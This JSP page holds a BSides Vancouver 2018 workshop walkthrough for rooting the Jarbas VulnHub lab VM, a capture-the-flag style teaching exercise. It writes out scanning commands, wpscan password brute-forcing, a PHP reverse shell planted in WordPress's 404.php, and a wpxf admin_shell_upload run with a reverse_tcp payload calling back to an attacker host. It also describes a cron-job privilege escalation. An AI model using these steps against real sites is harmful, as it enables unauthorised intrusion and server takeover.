<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>

<link rel="stylesheet" type="text/css" href='/css/main.css'>
</head>
<body>
	<div class="container">
        <p>Hello <span class="white">${user.getFirstName()}!</span> |
            <a href="/logout">Sign out</a>
        </p><br>
        
        <h2> BSides Vancouver: 2018 (Workshop) <span class="white">WALKTHROUGH</span></h2>
        <p>Boot2root challenges aim to create a safe environment where you can perform real-world penetration testing on an (intentionally) vulnerable target.This workshop will provide you with a custom-made VM where the goal is to obtain root level access on it. We are going to take down this box, you can download it <a href="https://www.vulnhub.com/entry/jarbas-1,232/">here</a>. Also please follow along as we go through it step by step.</p><br> 
        <h3>Spoiler alert: <span class="white">If you have worked on <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Mr Robot</a>, then you will realize that these two boxes are taken down almost the same way.</span></h3><br>
        <div class="target">
        
        <h2> TARGET <span class="white">DISCOVERY</span></h2>
            <p>Command:  <span class='white'>netdiscover -i eth0 -r 192.168.50.0/24</span> </p>	<br>		
             <img src= "/img/bsides_image/BSides_target_discovery.png"  alt="targetdiscovery"/>
        </div><br>
        <div class="nmap">
            
            <h2> NMAP <span class="white">SCANNING</span></h2>
            <p>Command:<span class="white">nmap -sS -PN -n -sV -sC -p- 192.168.50.166</span></p><br>			
             <img src= "/img/bsides_image/BSides_nmap_scan.png"  alt="nmapscan"/>
            <p>We have port 21, 22, and 80</p>
            <p>Let us start by checking port 80.</p><br>
            <h3>Port 80</h3>	
        </div>
        <div class="nikto">
            
            <h2> SCANNING TARGET PORT 80 WITH <span class="white">NIKTO</span></h2>
            
            <p>Command:<span class="white">nikto -h 192.168.50.166</span></p><br>			
             <img src= "/img/bsides_image/BSides_nikto_scan.png"  alt="niktoscan"/><br>
            <p>A wordpress directory "/backup_wordpress/" is revealed menaing that this web runs on wordpress, time to check the web app gui to see how it looks like. Nothing to attack Tiger, be patient.</p>
            <div class="parallax">
            </div>
            <br>
            <div class="webgui">		
            <h2> ACCESSING THE <span class="white">WEB APP</span></h2>
            <p>Accessing the web app on port 80</p><br>		
             <img src= "/img/bsides_image/BSides_web_gui.png"  alt="webgui"/><br>
            <p>What do we have? Nothing much, time to poke around and check the directory we discovered.</p>		
            </div><br>
            
            <div class="webappguiwordpressfolder">
            
            <h2> ACCESSING THE WORDPRESS DIRECTORY <span class="white">/backup_wordpress</span> </h2>
            <p>A wordpress directory <span class="white">"/backup_wordpress/"</span> with a user with a name <span class="white">"john"</span> and login page link. The future is promising Tiger, be patient.</p><br>		
             <img src= "/img/bsides_image/BSides_web_gui_wordpress_revealed.png"  alt="webpressfolder"/><br>
            <p>What do we have? Let us explore the link to the login page at the bottom under meta.</p>		
            </div><br>
            <h2> WORDPRESS LOGIN <span class="white">  PAGE</span></h2>
            <p>Our wordpress login page is confirmed, more enumeration is required to get the username and password.</p><br>
             <img src= "/img/bsides_image/BSides_wp_loginpage.png"  alt="Loginpage"/><br>
            <div class="parallax">		
            </div>
            <h2> WORDPRESS VERSION <span class="white"> ENUMERATION</span></h2>
            <p>Command:<span class="white">curl -s http://192.168.50.166/backup_wordpress/ | grep generator</span></p><br>
             <img src= "/img/bsides_image/BSides_wp_version.png"  alt="versionEnumImage"/><br>		
            <h2> WORDPRESS USERS <span class="white"> ENUMERATION</span></h2>
            <p>Command:<span class="white">wpscan --url http://192.168.50.166/backup_wordpress/ --enumerate u</span></p><br>
             <img src= "/img/bsides_image/BSides_wp_users.png"  alt="usersEnumImage"/><br>
    
            <h2> WORDPRESS USERS PASSWORDS<span class="white"> BRUTEFORCING</span></h2>
            <p>Command:<span class="white"> wpscan --url http://192.168.50.166/backup_wordpress/ --wordlist /usr/share/wordlists/rockyou.txt --username john --threads 20</span></p><br>
             <img src= "/img/bsides_image/BSides_wp_userspass.png"  alt="usersPassEnumImage"/><br>
            </div>	
    
            <div class="parallax">			
            </div>
            <div class="wordpressloggingin">
            <h2> LOGGING INTO <span class="white">WORDPRESS</span> </h2><br>
            <p>Now that we have <span class="white">a username: john</span> and <span class="white">a password: enigma</span>, let us use it to log into wordpress.</p><br>		
             <img src= "/img/bsides_image/BSides_logging_into_wordpress.png"  alt="webguilogin"/><br><br>
            <p>
            To execute commands, you will need to navigate to editor and then edit the 404.php file, this will also help us get a shell, you will need to replace the that 404.php file by a php reverse shell file,  <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.</p><br>
             <img src= "/img/bsides_image/BSides_limited_shell_method1.png"  alt="404"/><br><br>
            <p>Editing our reverse shell file</p>
            <h3>ATTACKER LOCAL IP: <span class="white">192.168.50.141</span></h3>
            <h3>ATTACKER LOCAL PORT: <span class="white">443</span></h3><br>
             <img src= "/img/bsides_image/BSides_limited_shell_method1_1.png"  alt="reverseshell"/><br><br>	
            <p>Click update for a successful edition like shown below.</p>
             <img src= "/img/bsides_image/BSides_limited_shell_method1_2.png"  alt="reverseshell"/><br><br>
            <p>Set up a netcat listener on attacker machine</p>
             <img src= "/img/bsides_image/BSides_limited_shell_method1_3_netcat.png"  alt="netcat"/><br><br>
            <div class="parallax">			
            </div>
        
            <h2> LIMITED SHELL WITH A PENTESTMONKEY PHP <span class="white">REVERSESHELL</span> </h2>
            
            <p>If you remember the path, you will navigate to it, PATH:<span class="white"> http://192.168.50.166/backup_wordpress/wp-content/themes/twentysixteen/404.php</span></p><br>	
             <img src= "/img/bsides_image/BSides_limited_shell_method1_4_folderpath.png"  alt="reverseshell"/><br><br>
            <p>If all goes well, you will get a shell after accessing the path link.</p>
             <img src= "/img/bsides_image/BSides_limited_shell_method1_5_shell.png"  alt="imitedshell"/><br>
            
            <h2>LIMITED SHELL METHOD 2 WITH WORDPRESS EXPLOIT <span class="white">FRAMEWORK</span> </h2>
            <p><span class="white">Download <a href="https://github.com/rastating/wordpress-exploit-framework">here</a>, the wordpress exploit framework and follow instructions on how to install it on your linux distro, then run the commands below.</span></p>
            <p><span class="white">ruby wpxf.rb</span></p>
            <p><span class="white">use exploit/shell/admin_shell_upload</span>	</p>	
            <p><span class="white">set host 192.168.50.166</span></p>
            <p><span class="white">set password enigma</span></p>
            <p><span class="white">set username john</span></p>		
            <p><span class="white">set target_uri /backup_wordpress/</span></p>
            <p><span class="white">set payload reverse_tcp</span></p>
            <p><span class="white">set lhost 192.168.50.135</span></p>
            <p><span class="white">set lport 4444</span></p>
            <p><span class="white">run</span><br></p>
            
            <h2>LOOK AT THAT, WE HAVE A SHELL WITH OUR 2nd <span class="white">METHOD</span></h2>
             <img src= "/img/bsides_image/BSides_limited_shell_method2_1.png"  alt="limitedshell"/><br>
            
            <div class="parallax">			
            </div>
            <h2> PRIVILEGE <span class="white">ESCALATION</span></h2>
            <p>Checking for installed programs</p><br>
             <img src= "/img/bsides_image/BSides_privesc2.png"  alt="installed programs"/><br>
    
            <p>Python 2.7 is intalled</p><br>
             <img src= "/img/bsides_image/BSides_privesc3.png"  alt="installedprograms"/><br>
    
            <p>Getting out of jail shell</p><br>
             <img src= "/img/bsides_image/BSides_privesc4.png"  alt="jailshellescape"/><br>
            <p>Where to write to and execute from /tmp, /var/tmp, /dev/shm, etc</p><br>
             <img src= "/img/bsides_image/BSides_privesc5.png"  alt="foderslisting"/><br>
            <p>What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID</p><br>
             <img src= "/img/bsides_image/BSides_privesc6.png"  alt="filepermissions"/><br>	
            <p>Let us check for cron jobs</p><br>
             <img src= "/img/bsides_image/BSides_privesc7.png"  alt="cronjobs"/><br>
            <p>Digging deeper into cron jobs</p><br>
             <img src= "/img/bsides_image/BSides_privesc8.png"  alt="cronjobs"/><br>
    
            <div class="parallax">			
            </div>
            <p>More juicy info</p><br>
             <img src= "/img/bsides_image/BSides_privesc9.png"  alt="cronjobs"/><br>
            <p>And more juicy info, something out of the ordinary is found “cleanup file”</p>
             <img src= "/img/bsides_image/BSides_privesc10.png"  alt="cronjobs"/><br>
            <p>More digging</p><br>
             <img src= "/img/bsides_image/BSides_privesc11.png"  alt="cronjobs"/><br>
            <div class="parallax">			
            </div>
            <p>Analyzing on the cron job “/usr/local/bin/cleanup”</p><br>
             <img src= "/img/bsides_image/BSides_privesc12.png"  alt="cronjobs"/><br>
            <p>Let us generate a python oneliner, and then replace the command in the cron job file.</p><br>
             <img src= "/img/bsides_image/BSides_privesc13.png"  alt="oneliner"/><br>
            <p>Create the "Cleanup" file locally and then upoad it, whatever works for you.</p><br>
             <img src= "/img/bsides_image/BSides_privesc14.png"  alt="cronjobs"/><br>
            <p>Set a php server on attacker machine and then upload the cleanup file into the /tmp directory on victim</p>
             <img src= "/img/bsides_image/BSides_privesc15.png"  alt="phpserver"/><br>
    
            <div class="parallax">			
            </div>
            <p>Downloading the evil cleanup file</p><br>
             <img src= "/img/bsides_image/BSides_privesc16.png"  alt="download"/><br>
            <p>Copying cleanup file into /usr/local/bin</p><br>
             <img src= "/img/bsides_image/BSides_privesc17.png"  alt="copy"/><br>
            <p>Cat cleanup file and execute it, booommmmm we got rootttttttttttttt</p><br>
             <img src= "/img/bsides_image/BSides_privesc18.png"  alt="execute"/><br>
            <p>There you go, we have our flag</p><br>
             <img src= "/img/bsides_image/BSides_privesc19.png"  alt="flag"/><br>	
        
        </div><br>
            <p> <span class="white">A very big thank you goes to the creator of this amazing machine, Abatchy17.</span> </p><br>
        </div>


</body>
</html>